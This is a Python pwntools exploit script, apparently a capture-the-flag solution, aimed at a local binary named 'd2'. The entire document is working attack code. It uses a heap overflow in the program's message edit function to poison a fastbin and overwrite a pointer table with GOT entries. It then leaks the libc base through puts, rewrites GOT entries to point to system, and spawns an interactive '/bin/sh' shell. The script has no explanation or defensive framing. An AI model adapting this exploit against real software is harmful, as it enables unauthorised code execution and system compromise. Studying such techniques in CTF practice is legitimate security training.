from pwn import *
from base64 import b64encode

r = process('./d2')
e = ELF('./d2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
bucket = 0x602180
def read_msg(idx, content):
    r.sendlineafter('Which? :', '1')
    r.sendlineafter('Which? :', str(idx))
    r.sendlineafter('msg:', content)
def edit_msg(idx, content):
    r.sendlineafter('Which? :', '2')
    r.sendlineafter('Which? :', str(idx))
    r.sendlineafter('new msg:', content)
def wipe_msg(idx):
    r.sendlineafter('Which? :', '3')
    r.sendlineafter('Which? :', str(idx))

read_msg(0, 'aaaaaaaaaaa'+b64encode('A'*0x50))
read_msg(2, b64encode('A'*0x200))
read_msg(3, b64encode('A'*0x80))
read_msg(4, b64encode('A'*0x10))

edit_msg(2, 'A'*0x1f0+p64(0x200))
wipe_msg(2)
edit_msg(0, 'A'*0x58)

read_msg(2, b64encode('A'*0x80))
read_msg(5, b64encode('B'*0x48))
wipe_msg(2)
wipe_msg(3)

wipe_msg(5)
read_msg(6, b64encode('C'*0x100))#
read_msg(2, b64encode('C'*0xa0))
target = bucket-6
edit_msg(2, 'C'*0x80+p64(0)+p64(0x60)+p64(target)+p64(0))

read_msg(7, b64encode('A'*0x1e0))
read_msg(8, b64encode('A'*0x50))
read_msg(9, b64encode('\x00'*6+p64(bucket)+p64(e.got['free'])+p64(e.got['puts'])+p64(e.got['strlen'])+p64(e.got['atoi'])+'A'*(0x50-0x28)))

edit_msg(3, p64(e.plt['puts']))
wipe_msg(4)
r.recvuntil('Which? :')
libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['puts']
system = libc_base + libc.symbols['system']
log.info('libc base:%#x' % libc_base)

edit_msg(5, p64(0x0000000000400E86))
r.sendlineafter('Which? :', '2')
r.sendlineafter('Which? :', '6')
r.sendline(p64(system)+'\x00'*8)
r.sendline(p64(system)+'\x00'*8)

r.sendline('/bin/sh')
r.clean()

r.interactive()
